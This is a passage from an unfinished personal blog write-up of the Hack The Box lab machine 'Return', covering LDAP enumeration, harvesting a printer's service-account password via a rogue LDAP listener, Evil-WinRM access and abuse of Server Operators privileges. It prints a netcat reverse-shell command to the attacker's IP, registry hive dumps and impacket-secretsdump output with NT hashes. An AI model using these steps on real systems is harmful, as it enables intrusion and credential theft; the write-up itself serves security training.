<li>As the functional level increases, additional Active Directory features become available, but older versions of Windows Server may not be supported as domain controllers.</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p><!-- raw HTML omitted -->We have the full server name<!-- raw HTML omitted -->:</p>
<ul>
<li>Again we can see this has the CN as the base (mentioned previously.) So it appears it&rsquo;s a printer server site of some sort. What is also interesting is the CN name &ldquo;Configuration&rdquo;, this could imply that it is still to be configured. Which is interesting as things that are still being configured may not have had thorough security stanards actioned.







<div class="codeblock">
    
        <div class="copy-button-box">
            <button class="copy-button" state="copy" data="#ZgotmplZ">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>        serverName:
</span></span><span style="display:flex;"><span>          CN<span style="color:#f92672">=</span>PRINTER,CN<span style="color:#f92672">=</span>Servers,CN<span style="color:#f92672">=</span>Default-First-Site-Name,CN<span style="color:#f92672">=</span>Sites,CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span><span style="color:#66d9ef">return</span>,DC<span style="color:#f92672">=</span>local
</span></span><span style="display:flex;"><span>        schemaNamingContext:</span></span></code></pre></div>
    
</div>
</li>
</ul>
</li>
</ol>
</li>
<li>
<p>It&rsquo;s pretty amazing already what we have learned just by running some fairly simple ldap queries.</p>
<ul>
<li>We have the naming context.</li>
<li>Domain name.</li>
<li>But wait there&rsquo;s more‚Ä¶.</li>
</ul>
</li>
</ul>
<h4 id="enumerating-the-webserver-and-getting-a-foothold">Enumerating the Webserver &amp; Getting a foothold:</h4>
<ul>
<li>We can see a webserver running on the host:
<ul>
<li><figure><img src="/ox-hugo/2024-08-31-084657_.png">
</figure>
</li>
</ul>
</li>
<li>This is interesting as it&rsquo;s a domain joined printer and this is the admin/settings page. For this printer to be able to operate and be used on the domain, it will have credentials stored. So we should be able to extract these.</li>
<li>I stand up an nc listener &amp; listen on ldap port <code>389</code>
<ul>
<li><code>sudo nc -lvnp 389</code></li>
<li>I then enter my email address and click &ldquo;Update&rdquo;</li>
<li>I immediately get a connection anda  password is displayed.
<ul>
<li><figure><img src="/ox-hugo/2024-08-31-085401_.png">
</figure>
</li>
</ul>
</li>
<li><!-- raw HTML omitted -->I verify the password is valid using netexec<!-- raw HTML omitted -->:
<ul>
<li><figure><img src="/ox-hugo/2024-08-31-085727_.png">
</figure>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h5 id="ldap-bind-detour">Ldap Bind Detour</h5>
<ul>
<li>I had wireshark running at this time to capture any interesting traffic &amp; here we can see the <code>POST</code> request from the server &amp; the subsequent <code>LDAP BIND REQUEST</code> to our malicious server.
<ul>
<li><figure><img src="/ox-hugo/2024-09-01-095413_.png">
</figure>
</li>
<li>We can actually gather a significant amount of information from this packet.
<ol>
<li>The version of LDAP being used.
<ul>
<li>This particular printer is using 2, however the most recent version is 3.</li>
</ul>
</li>
<li>The name of the client/user making the request:
<ul>
<li><code>return\svc-printer</code></li>
</ul>
</li>
<li>The Authentication method:
<ul>
<li><code>(0) Simple</code> aka as clear text passwords.</li>
</ul>
</li>
</ol>
</li>
<li><figure><img src="/ox-hugo/2024-09-01-095817_.png">
</figure>
</li>
</ul>
</li>
</ul>
<h4 id="i-connect-to-the-host-via-evil-winrm">I connect to the host via Evil-Winrm:</h4>
<ul>
<li>
<p>I want to be fully transparent here, I didn&rsquo;t go straight to checking evil-winrm and connecting. Instead I messed around with SMB and enumerating the shares, which is not a bad thing but I should have realistically checked for this earlier. I hear you say &ldquo;but why are you telling me this?&rdquo; well, there are a lot of videos and writeups for boxes where people go &ldquo;I did A,B,C &amp; that&rsquo;s how I owned this box in 3 minutes flat&rdquo; but that&rsquo;s not the reality of it, and it sets unrealistic expectations for people. In reality, you try various things and they fail and then you realize you missed something and do that. Granted this will improve with time and methodology however It&rsquo;s not true when you are starting out &amp; that is okay.</p>
</li>
<li>
<p>I connect &amp; check my users privs:</p>
</li>
<li>
<figure><img src="/ox-hugo/2024-08-31-092915_.png">
</figure>

</li>
<li>
<p>I can see that I have the <code>SeBackupPrivilege</code> which effectivley means I have <code>NT AUTHORITY SYSTEM</code>.</p>
</li>
<li>
<p>I check my group membership and can see I am part of the <code>Server Operators</code>:</p>
<ul>
<li><figure><img src="/ox-hugo/2024-09-01-100535_.png">
</figure>
</li>
<li>This is a high-privileged group:</li>
</ul>
</li>
<li>
<p>The Server Operators group allows members to administer Windows servers without needing assignment of Domain Admin privileges. <strong>It is a very highly privileged group that can log in locally to servers, including Domain Controllers.</strong></p>
<ul>
<li>We get the below capabilites by being part of this group:
<ul>
<li>Interactive sign-in to servers.</li>
<li>Create and delete network shared resources.</li>
<li>Start and stop services.</li>
<li>Back up and restore files.
<ul>
<li>As seen in <code>SeBackupPrivilege</code> &amp; <code>SeRestorePrivilege</code></li>
</ul>
</li>
<li>Format the hard disk drive.</li>
<li>Shut down the computer.</li>
</ul>
</li>
</ul>
</li>
</ul>
<h5 id="why-sebackupprivilege-is-dangerous">&ldquo;why <code>SeBackupPrivilege</code> is dangerous:</h5>
<ul>
<li>Here is why <code>SeBackupPrivilege</code> is so dangerous if we control a user who has the privilege:</li>
<li>The privilege will let us copy ANY file from a folder, even if there is no access control entry (ACE) for us in the folder&rsquo;s access control list (ACL)</li>
<li>However, we can&rsquo;t do this using the standard copy command. Instead, we need to programmatically copy the data, making sure to specify the <a href="https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea">FILE_FLAG_BACKUP_SEMANTICS</a> flag. E.G. Use Diskshadow.exe
<ul>
<li>Some more fun facts about this privilege:</li>
<li><strong>Members of the</strong> Backup Operators Group &amp; Server Operators:</li>
<li>Provides read access to all files and directories for backup purposes, bypassing standard permissions.
<ul>
<li>Allows a process to read any file, regardless of the file&rsquo;s permissions.</li>
<li>Used primarily for backup applications that need access to all files.</li>
<li>Does not enable writing or deleting files, only reading.</li>
</ul>
</li>
<li>Security Considerations
<ul>
<li>High potential for abuse if granted to unauthorized applications or users.</li>
<li>Should be closely monitored and restricted to trusted applications and personnel.</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="path-to-nt-authority-system">Path to NT Authority\System:</h4>
<ul>
<li>Inititally I actually went down the path of dumping the registry hives for a <code>SAM</code> attack. As we do not have access to an actual domain controller so a DC Sync/Dumping <code>NTDS.dit</code> attack was no feasible. Just getting NT Locally would be enough to meet our needs. However when performing this attack I was successul in extracting the administrators hash but all pass the hash attacks (PTH) and attempts to login is as the administrator would not work, so the account login must be restricted locally.</li>
</ul>
<!-- raw HTML omitted -->
<ul>
<li>
<p>I copy an nc.exe binary to the host and started a reverse shell that way.</p>
</li>
<li>
<p>Copy binary:</p>







<div class="codeblock">
    
        <div class="copy-button-box">
            <button class="copy-button" state="copy" data="#ZgotmplZ">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Info<span style="color:#960050;background-color:#1e0010">:</span> Establishing connection to remote endpoint
</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\svc-printer\Documents&gt; ls
</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\svc-printer\Documents&gt; upload nc.exe
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Info<span style="color:#960050;background-color:#1e0010">:</span> Uploading /mnt/<span style="color:#ae81ff">100</span>gb/Dropbox/Dropbox/<span style="color:#ae81ff">40</span>-49_Career/<span style="color:#ae81ff">45</span>-KaliShared/<span style="color:#ae81ff">45.01</span>-WindowsTools/nc.exe to C:\Users\svc-printer\Documents\nc.exe
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Data<span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#ae81ff">51488</span> bytes of <span style="color:#ae81ff">51488</span> bytes copied</span></span></code></pre></div>
    
</div>
<ul>
<li><figure><img src="/ox-hugo/2024-08-31-094552_.png">
</figure>
</li>
</ul>
</li>
<li>
<p>Start listener:</p>







<div class="codeblock">
    
        <div class="copy-button-box">
            <button class="copy-button" state="copy" data="kali%20in%20~%20%203GiB/7GiB%20%7c%200B/1GiB%20with%20/usr/bin/zsh%0a%f0%9f%95%99%2009:43:41%20zsh%20%e2%9d%af%20nc%20-nvlp%204321">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>kali in ~  3GiB/7GiB | 0B/1GiB with /usr/bin/zsh
</span></span><span style="display:flex;"><span>üïô 09:43:41 zsh ‚ùØ nc -nvlp <span style="color:#ae81ff">4321</span></span></span></code></pre></div>
    
</div>
</li>
<li>
<p>Connect:</p>







<div class="codeblock">
    
        <div class="copy-button-box">
            <button class="copy-button" state="copy" data="#ZgotmplZ">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\s</span>vc-printer<span style="color:#ae81ff">\D</span>ocuments&gt; .<span style="color:#ae81ff">\n</span>c.exe 10.10.14.131 <span style="color:#ae81ff">4321</span> -e cmd.exe</span></span></code></pre></div>
    
</div>
<ul>
<li><figure><img src="/ox-hugo/2024-08-31-094713_.png">
</figure>
</li>
</ul>
</li>
</ul>
<!-- raw HTML omitted -->
<ul>
<li>
<p>I dump the SAM Registeries:</p>







<div class="codeblock">
    
        <div class="copy-button-box">
            <button class="copy-button" state="copy" data="#ZgotmplZ">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Info: Upload successful!
</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\s</span>vc-printer<span style="color:#ae81ff">\D</span>ocuments&gt; reg save HKLM<span style="color:#ae81ff">\S</span>YSTEM SYSTEM.SAV
</span></span><span style="display:flex;"><span>The operation completed successfully.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\s</span>vc-printer<span style="color:#ae81ff">\D</span>ocuments&gt; reg save HKLM<span style="color:#ae81ff">\S</span>AM SAM.SAV
</span></span><span style="display:flex;"><span>The operation completed successfully.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\s</span>vc-printer<span style="color:#ae81ff">\D</span>ocuments&gt; reg save HKLM<span style="color:#ae81ff">\S</span>ECURITY SECURITY.SAV
</span></span><span style="display:flex;"><span>reg.exe : ERROR: Access is denied.
</span></span><span style="display:flex;"><span>‚Äã    + CategoryInfo          : NotSpecified: <span style="color:#f92672">(</span>ERROR: Access is denied.:String<span style="color:#f92672">)</span> <span style="color:#f92672">[]</span>, RemoteException
</span></span><span style="display:flex;"><span>‚Äã    + FullyQualifiedErrorId : NativeCommandError</span></span></code></pre></div>
    
</div>
<ul>
<li>But I then dump the hashes and they are not working for local-auth or domain:







<div class="codeblock">
    
        <div class="copy-button-box">
            <button class="copy-button" state="copy" data="kali%20in%20Dropbox/40-49_Career/46-Boxes/46.02-HTB/Return%20%203GiB/7GiB%20%7c%200B/1GiB%20with%20/usr/bin/zsh%0a%f0%9f%95%99%2010:08:13%20zsh%20%e2%9c%96%20%20sudo%20impacket-secretsdump%20-sam%20SAM.SAV%20-system%20SYSTEM.SAV%20LOCAL%0a[sudo]%20password%20for%20kali:%0aImpacket%20v0.12.0.dev1%20-%20Copyright%202023%20Fortra%0a%0a[*]%20Target%20system%20bootKey:%200xa42289f69adb35cd67d02cc84e69c314%0a[*]%20Dumping%20local%20SAM%20hashes%20%28uid:rid:lmhash:nthash%29%0aAdministrator:500:aad3b435b51404eeaad3b435b51404ee:34386a771aaca697f447754e4863d38a:::%0aGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::%0aDefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::%0a[-]%20SAM%20hashes%20extraction%20for%20user%20WDAGUtilityAccount%20failed.%20The%20account%20doesn%27t%20have%20hash%20information.%0a[*]%20Cleaning%20up...">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>kali in Dropbox/40-49_Career/46-Boxes/46.02-HTB/Return  3GiB/7GiB | 0B/1GiB with /usr/bin/zsh
</span></span><span style="display:flex;"><span>üïô 10:08:13 zsh ‚úñ  sudo impacket-secretsdump -sam SAM.SAV -system SYSTEM.SAV LOCAL
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> kali:
</span></span><span style="display:flex;"><span>Impacket v0.12.0.dev1 - Copyright <span style="color:#ae81ff">2023</span> Fortra
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Target system bootKey: 0xa42289f69adb35cd67d02cc84e69c314
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Dumping local SAM hashes <span style="color:#f92672">(</span>uid:rid:lmhash:nthash<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Administrator:500:aad3b435b51404eeaad3b435b51404ee:34386a771aaca697f447754e4863d38a:::
</span></span><span style="display:flex;"><span>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span></span><span style="display:flex;"><span>DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> SAM hashes extraction <span style="color:#66d9ef">for</span> user WDAGUtilityAccount failed. The account doesn<span style="color:#960050;background-color:#1e0010">&#39;</span>t have hash information.
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Cleaning up...</span></span></code></pre></div>
    
</div>
</li>
</ul>
</li>
</ul>
<p><a href="https://myhomeisquintoc.com/challenge/return">https://myhomeisquintoc.com/challenge/return</a></p>
<p><a href="https://0xdf.gitlab.io/2022/05/05/htb-return.html">https://0xdf.gitlab.io/2022/05/05/htb-return.html</a></p>
<ol>
<li><strong>Enumerating SMB</strong>:
As we have a foothold we can now being to enumerate other services that require credentials:
<ol>
<li>
<p>Using netexec I find that we have <code>&quot;READ,WRITE&quot;</code> perms over the <code>C$ Default Share</code></p>
<ul>
<li><figure><img src="/ox-hugo/2024-08-31-085921_.png">
</figure>
</li>
</ul>
</li>
<li>
<p><!-- raw HTML omitted -->I then connect using smbclient<!-- raw HTML omitted -->:</p>
<ul>
<li><figure><img src="/ox-hugo/2024-08-31-090738_.png">
</figure>
</li>
</ul>
</li>
<li>
<p><!-- raw HTML omitted -->User Flag Obtained<!-- raw HTML omitted -->:</p>
<ul>
<li><figure><img src="/ox-hugo/2024-08-31-090819_.png">
</figure>
</li>
<li><figure><img src="/ox-hugo/2024-08-31-090850_.png">
</figure>
</li>
</ul>
</li>
</ol>
</li>
</ol>
<!-- raw HTML omitted -->
<ol>
<li>
<h2 id="enumerate-users-description-field-for-creds"><strong>Enumerate Users Description Field for Creds</strong>:</h2>
</li>
</ol>
<!-- raw HTML omitted -->
<ul>
<li><strong>Launch Diskshadow.exe</strong>:
<ul>
<li>Initially I tried to do this from evil-winrm but it does not play nicely.
<ul>
<li><figure><img src="/ox-hugo/2024-08-31-094514_.png">
</figure>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="todolist">TODOLIST: <!-- raw HTML omitted -->[0/5]<!-- raw HTML omitted --></h4>
<h5 id="dot"><!-- raw HTML omitted -->TODO<!-- raw HTML omitted --> .</h5>
<h5 id="dot"><!-- raw HTML omitted -->TODO<!-- raw HTML omitted --> .</h5>
<h5 id="dot"><!-- raw HTML omitted -->TODO<!-- raw HTML omitted --> .</h5>
<h5 id="dot"><!-- raw HTML omitted -->TODO<!-- raw HTML omitted --> .</h5>
<h4 id="re-check-existing-findings-if-stuck-and-think-dumber"><!-- raw HTML omitted -->TODO<!-- raw HTML omitted --> <em>RE-CHECK Existing Findings if stuck &amp; think dumber!</em></h4>
<h4 id="what-do-we-know">What do we know?</h4>
<p><del>Do you need to enumerate more?</del></p>
<ol>
<li></li>
<li></li>
</ol>
<h4 id="what-did-i-learn">What did I learn?</h4>
<ol>
<li></li>
<li></li>
<li></li>
</ol>
<h4 id="what-silly-mistakes-did-i-make">What silly mistakes did I make?</h4>
<ol>
<li></li>
<li></li>
</ol>

            
        </div>
    </article>

        </main>

        <footer class="footer">
    <div class="footer-left">
        <ul class="social">
            
                <li>All Rights Reserved ¬Æ.</li>
            

            
                <li>Bloodstiller</li>
            

            
                
            
                
            
                
                    <li>
                        
                            <a href="https://github.com/bloodstiller" target="_blank">
                                <i class="bi-github"></i>
                            </a>
                        

                    </li>
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
        </ul>
    </div>

    <div class="footer-right">
        <ul class="control status clearfix">
            
                <li>
                    
                        Word Count:
                        2151
                    
                </li>
            

            
            

            
                <li>en</li>
            

            
                <li>
                    <a href="https://gohugo.io" class="btn" target="_blank"
                        >Hugo: 0.133.1</a
                    >
                </li>
            

            
                <li>
                    <a
                        href="https://github.com/JingWangTW/dark-theme-editor"
                        class="btn"
                        target="_blank"
                        >Theme: dark-theme-editor</a
                    >
                </li>
            

            
                <li>
                    
                        Last modified: &nbsp;
                        <time>
                            Jan 01 0001 00:00:00
                        </time>
                    
                </li>
            

            
                <li title="">
                    
                </li>
            
        </ul>
    </div>
</footer>

    </body>

    






















    
        
        <script
            type="text/javascript"
            src="/_theme/js/codeblock_copy.c59588ba3a219dafab515508b0bcd2d0592dc9e0e08de20dc1983bfd8cb69d03d37c78eadd81ee7bef724570f9e4286d9ea1c53ca59d3711c0bcad9e9134d0e9.js"
            integrity="sha512-xZWIujohna&#43;rUVUIsLzS0FktyeDgjeINwZg7/Yy2nQPTfHjq3YHue&#43;9yRXD55ChtnqHFPKWdNxHAvK2ekTTQ6Q=="></script>
    
        
        <script
            type="text/javascript"
            src="/_theme/js/dir_toggle.e6f8c63f3ed9aefa9cedb3be3d5ab67e00bc3cf87a8dd7ef1ed55d642e9a7d80837636a26ae77f967f2aa74a44ae70c4134e25abca587f048c60807ba9e9c82f.js"
            integrity="sha512-5vjGPz7Zrvqc7bO&#43;PVq2fgC8PPh6jdfvHtVdZC6afYCDdjaiaud/ln8qp0pErnDEE04lq8pYfwSMYIB7qenILw=="></script>
    
        
        <script
            type="text/javascript"
            src="/_theme/js/sidebar.01b59c615736643387108a100de70c51d5e98477bdc338244a87d37f7e38286b48683459eade68087f0688f0235e7a48691e633954fa930d41823e9ddf797085.js"
            integrity="sha512-AbWcYVc2ZDOHEIoQDecMUdXphHe9wzgkSofTf344KGtIaDRZ6t5oCH8GiPAjXnpIaR5jOVT6kw1Bgj6d33lwhQ=="></script>
    















<link
    rel="stylesheet"
    href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css" />




</html>
